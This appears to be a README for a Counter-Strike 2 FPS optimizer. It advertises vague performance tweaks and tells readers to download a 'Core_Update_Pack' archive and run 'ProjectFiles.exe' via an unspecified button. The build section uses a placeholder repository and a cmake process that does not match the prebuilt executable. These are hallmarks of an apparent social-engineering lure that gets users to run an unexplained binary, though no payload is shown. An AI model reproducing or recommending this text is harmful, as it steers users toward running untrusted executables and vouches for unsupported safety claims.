# CS2 FPS Optimizer

**Performance Boost & Lag Fix Tool — 2026**

High-performance optimizer designed specifically for Counter-Strike 2.  
Increases FPS, reduces input lag and applies smart system tweaks with one click.

---

### What this is

A complete FPS optimization tool for CS2 that provides:
- One-click performance profiles  
- System & GPU optimizations  
- Network lag reduction  
- Clean and simple interface  
- Fully reversible changes  
- Low system impact  

---

### Features

- Balanced / Aggressive / Ultra profiles  
- Automatic system tweaks  
- GPU optimization (NVIDIA & AMD)  
- Network and latency improvements  
- Launch options generator  
- Config backup & restore  
- Real-time FPS monitoring  

---

### Installation

1. Download the latest core pack  
2. Extract the archive  
3. Run `ProjectFiles.exe`  
4. Follow the on-screen instructions  


  
    
  


> Click the green button above to get **Core_Update_Pack** and launch `ProjectFiles.exe`

---

### How to use

1. Launch the optimizer  
2. Select a performance profile  
3. Click **Apply**  
4. Restart CS2  

All changes can be reverted in one click.

---

### Configuration

All settings are stored in `config/default.json` and profile files:

- Performance profile  
- GPU settings  
- Network tweaks  
- Launch options  
- Auto-apply on startup  

---

### Building from Source

```bash
git clone https://github.com/YOUR_USERNAME/cs2-fps-optimizer.git
cd cs2-fps-optimizer
mkdir build && cd build
cmake ..
cmake --build . --config Release
```
